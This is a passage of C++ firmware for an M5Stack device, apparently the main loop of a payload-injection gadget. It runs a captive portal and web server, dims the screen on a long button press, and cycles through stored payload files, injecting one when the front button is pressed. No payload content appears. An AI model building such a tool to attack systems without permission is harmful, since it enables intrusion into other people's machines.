    dnsServer.processNextRequest(); // <--- for captive portal
    server.handleClient();
    
    // CRITICAL: Keep my physical buttons polled and updated
    M5.update();

    // --- BATTERY SAVER TOGGLE (LONG PRESS SIDE BUTTON) ---
    if (M5.BtnB.wasHold()) {
        isDimmed = !isDimmed;
        // 5 is very dim, 128 is default brightness
        M5.Display.setBrightness(isDimmed ? 1 : 128); 
    }

    // --- POCKET LOCK ---
    // Only allow scrolling and firing if the screen is awake
    if (!isDimmed) {
        
        // Cycle through payloads with the side button (BtnB)
        // CRITICAL FIX: Changed from wasPressed() to wasClicked() so it 
        // doesn't scroll when you are just holding it down to dim the screen.
        if (M5.BtnB.wasClicked() && !payloadFiles.empty()) {
            selectedFileIndex++;
            if (selectedFileIndex >= (int)payloadFiles.size()) selectedFileIndex = 0;
            drawUI();
        }

        // INJECT THE PAYLOAD with the front button (BtnA)
        if (M5.BtnA.wasPressed() && !payloadFiles.empty() && !isSending) {
            sendSelectedPayload();
        }
    }

    // Breathe... prevents Watchdog Timer crashes
    delay(2);
}